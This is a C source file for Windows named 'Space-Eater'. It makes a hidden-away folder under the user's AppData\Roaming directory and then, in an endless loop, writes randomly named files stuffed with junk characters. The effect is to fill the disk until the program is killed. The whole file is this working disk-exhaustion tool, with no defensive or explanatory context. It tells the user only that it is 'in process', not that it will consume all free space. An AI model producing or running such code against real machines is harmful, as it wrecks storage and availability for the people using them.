#include <stdio.h>
#include <conio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
int main(){
	FILE *fp;
	time_t startTime = time(NULL);
	time_t secs = 15;
	char str[100]="DFASDFEWFWEFDSFSDFDAFDerger()($#*$*$(*$$)(%*(&&%*)#(()#@(#$$$$$$$$$$$$$##############_)(((#(*#&&$&&$^#&##*@($)%@$*%#($%$#@)%((#$*%(#)$%($#*^&*@(#$)%(*#$(%)))))))))))))";
	char name[100];
	system("cls");
	system("COLOR 0A");
	system("TITLE Space-Eater");
	char dir[200];
	char cmd[100]="";
	char temp[100];
	strcpy(dir, getenv("USERPROFILE"));
    strcat(dir, "\\AppData\\Roaming");
    strcat(cmd, dir);
    strcat(cmd, "\\spEt");
    mkdir(cmd);
    printf("\n\tCheck out %s for updates", cmd);
	system("COLOR 0A");
	printf("\n\n\tIn process. Each bar represents a file...\n\t");
	while(1){
		strcpy(name, cmd);
		strcat(name, "\\");
		srand(time(0));
		itoa(rand(), temp, 10);
		strcat(name, temp);
		fp = fopen(name, "w");
		startTime = time(NULL);
		while (time(NULL) - startTime < secs)
		{
	    	fputs(str, fp);
			fprintf(fp, "%s%s\n\n\n\n\n\n\n\n\n\n\n\t\t\t\t\t\t\t\n\n\n\n", str, str);
		}
		fclose(fp);
		printf("|");
	}
	system("pause");
	return 0;
}
